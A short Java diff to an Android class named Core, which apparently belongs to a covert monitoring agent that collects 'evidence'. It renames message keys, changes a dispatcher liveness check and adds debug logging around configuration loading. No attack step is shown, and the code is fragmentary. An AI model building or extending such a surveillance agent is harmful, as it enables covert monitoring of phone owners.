@@ -125,7 +125,7 @@ public class Core extends Activity implements Runnable {
 		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
 		wl.acquire();
 
-		EvidenceReference.info(Messages.getString("30.1")); //$NON-NLS-1$
+		EvidenceReference.info(Messages.getString("30_1")); //$NON-NLS-1$
 
 		serviceRunning = true;
 		return true;
@@ -375,8 +375,15 @@ public class Core extends Activity implements Runnable {
 			// Start log dispatcher
 			final EvDispatcher logDispatcher = EvDispatcher.self();
 
-			if (!logDispatcher.isAlive()) {
+			if (!logDispatcher.isRunning()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (taskInit), start evDispatcher");
+				}
 				logDispatcher.start();
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (taskInit), evDispatcher already started ");
+				}
 			}
 
 			// Da qui in poi inizia la concorrenza dei thread
@@ -471,10 +478,10 @@ public class Core extends Activity implements Runnable {
 			loaded = loadConfFile(file, true);
 
 			if (!loaded) {
-				EvidenceReference.info(Messages.getString("30.2")); //$NON-NLS-1$
+				EvidenceReference.info(Messages.getString("30_2")); //$NON-NLS-1$
 				file.delete();
 			} else {
-				EvidenceReference.info(Messages.getString("30.3")); //$NON-NLS-1$
+				EvidenceReference.info(Messages.getString("30_3")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
 			}
@@ -491,7 +498,7 @@ public class Core extends Activity implements Runnable {
 				loaded = loadConfFile(file, true);
 
 				if (!loaded) {
-					EvidenceReference.info(Messages.getString("30.4")); //$NON-NLS-1$
+					EvidenceReference.info(Messages.getString("30_4")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
 				}
